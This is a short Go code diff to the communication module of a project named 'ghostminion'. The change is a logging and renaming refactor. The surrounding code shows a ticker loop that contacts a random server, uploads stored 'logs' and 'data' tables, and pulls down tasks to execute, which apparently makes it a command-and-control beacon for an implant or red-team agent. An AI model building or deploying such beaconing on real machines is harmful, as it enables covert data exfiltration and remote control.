@@ -2,7 +2,6 @@ package communication
 
 import (
 	"encoding/json"
-	"fmt"
 	"ghostminion/apps"
 	"ghostminion/config"
 	"ghostminion/db"
@@ -32,12 +31,12 @@ func Routine(taskCh chan<- apps.AppData) {
 		<-ticker.C
 		serverConfig := getRandomServer()
 		if !CanCommunicate(serverConfig) {
-			fmt.Printf("Communicating with server %s failed", serverConfig.Address)
+			lgr.Error("Can't communicate with server", serverConfig.Address)
 		} else {
 			sendData("logs")
 			sendData("data")
-			tasks := getTasks(serverConfig)
-			for _, task := range tasks { // stream each task individually
+			tasks := fetchTasks(serverConfig)
+			for _, task := range tasks {
 				taskCh <- task
 			}
 		}
@@ -67,7 +66,7 @@ func sendData(table string) {
 	}
 }
 
-func getTasks(serverConfig config.ServerConfig) []apps.AppData {
+func fetchTasks(serverConfig config.ServerConfig) []apps.AppData {
 	tasksRaw, _, err := SendRequest(
 		GET,
 		CreateRoute(serverConfig, "tasks"),
@@ -77,13 +76,13 @@ func getTasks(serverConfig config.ServerConfig) []apps.AppData {
 		nil,
 	)
 	if err != nil {
-		fmt.Println("Error:", err)
+		lgr.Error("Got error while fetching tasks", err)
 		return nil
 	}
 
 	var tasks []apps.AppData
 	if err := json.Unmarshal(tasksRaw, &tasks); err != nil {
-		fmt.Println("Failed to unmarshal tasks:", err)
+		lgr.Error("Got error while unmarshalling tasks", err)
 		return nil
 	}
 
